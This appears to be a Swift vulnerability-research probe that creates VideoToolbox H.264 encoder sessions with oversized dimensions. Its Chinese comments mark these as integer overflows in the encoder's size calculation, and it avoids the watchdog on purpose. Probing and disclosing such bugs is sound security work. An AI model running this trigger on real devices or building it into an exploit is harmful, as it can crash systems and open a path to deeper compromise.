import AVFoundation
import VideoToolbox

final class AVERunnerV2 {
    static let shared = AVERunnerV2()
    private init() {}

    // 扫描序列
    private let dims: [(Int32, Int32, String)] = [
        (1920, 1080, "1080p正常"),
        (65536, 65536, "65536²(不溢出)"),
        (65537, 65537, "65537²(溢出→0x20001)"),
        (131072, 65538, "131072×65538(溢出→0x40000)"),
        (262144, 65537, "262144×65537(溢出→0x40000)"),
        (32768, 131073, "32768×131073(溢出→0x20000)"),
    ]
    private var idx = 0

    func start(_ report: @escaping (String) -> Void) {
        let (w, h, tag) = dims[idx]
        report("=== v2[\(idx)] \(tag): \(w)x\(h) ===")

        var session: VTCompressionSession?
        let status = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            width: w, height: h,
            codecType: kCMVideoCodecType_H264,
            encoderSpecification: nil,
            imageBufferAttributes: nil,
            compressedDataAllocator: nil,
            outputCallback: nil, refcon: nil,
            compressionSessionOut: &session)
        report("create=\(status) \(status == noErr ? "OK" : "REJECT")")
        guard status == noErr, let s = session else { return }

        VTSessionSetProperty(s, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanTrue)
        VTSessionSetProperty(s, key: kVTCompressionPropertyKey_ProfileLevel,
                             value: kVTProfileLevel_H264_Baseline_AutoLevel)

        // 小帧 64x64 —— 会话尺寸才是关键
        var pb: CVPixelBuffer?
        let ps = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                                     kCVPixelFormatType_32BGRA, nil, &pb)
        report("pb=\(ps)")
        if let p = pb {
            var flags: VTEncodeInfoFlags = []
            let enc = VTCompressionSessionEncodeFrame(s, imageBuffer: p,
                presentationTimeStamp: CMTime(value: 0, timescale: 600),
                duration: CMTime(value: 1, timescale: 600),
                frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
            report("encode=\(enc) flags=\(flags.rawValue)")
            // 不调 CompleteFrames(避免看门狗), 立即释放
            VTCompressionSessionInvalidate(s)
            report("done")
        } else {
            VTCompressionSessionInvalidate(s)
            report("no pb")
        }
    }

    func next() -> String {
        idx = (idx + 1) % dims.count
        return "next v2 = \(dims[idx].2)"
    }
}
